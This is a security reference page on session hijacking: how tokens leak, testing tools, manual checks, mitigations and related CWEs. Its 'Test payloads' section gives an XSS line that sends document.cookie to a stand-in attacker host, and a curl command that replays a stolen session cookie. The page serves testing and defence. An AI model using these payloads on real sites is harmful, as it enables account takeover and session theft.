# What is Session Hijacking?

Session Hijacking is stealing or predicting a valid session token and using it to impersonate the user, no password required. If you have the token, you are the user for as long as it lives. Tokens leak through XSS, network sniffing on plaintext channels, weak generation, or careless logging.

## How tokens get stolen

- **XSS** - script reads a non-HttpOnly cookie and ships it out
- **Sniffing** - session sent over HTTP or mixed content
- **Predictable IDs** - sequential or low-entropy tokens can be guessed
- **Leakage** - tokens in URLs, logs, referrers, or error pages

## Test payloads

```javascript
// XSS payload to exfiltrate a readable cookie
new Image().src = 'https://attacker.oastify.com/?c=' + document.cookie;

// Use a captured token from any client
// (browser console or curl)
```

```bash
# Replay a stolen session with curl
curl https://target.tld/account \
  -H "Cookie: SESSIONID=stolen_value_here"
```

## Tools

- [Burp Suite Sequencer](https://portswigger.net/burp) - measure token randomness/entropy
- [Wireshark](https://www.wireshark.org/) - spot tokens sent in the clear
- [mitmproxy](https://mitmproxy.org/) - intercept and replay sessions

## Manual testing

1. Grab a valid session token from your own login
2. Replay it from a different browser/IP - does it still work?
3. Check whether the token is `HttpOnly`, `Secure`, and rotated after login
4. Feed many tokens into Burp Sequencer to check for predictability
5. Hunt for tokens leaking in URLs, logs, or third-party requests

## Mitigation

- Cookies must be `HttpOnly`, `Secure`, and `SameSite`
- Serve everything over HTTPS with HSTS
- Generate high-entropy, unpredictable tokens
- Rotate on login, expire on idle, and bind sessions to context
- Provide server-side logout that truly invalidates the token

## Deep dive

- [Session Hijacking - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

## CWE

- CWE-384: Session Fixation (related)
- CWE-613: Insufficient Session Expiration
- CWE-330: Use of Insufficiently Random Values
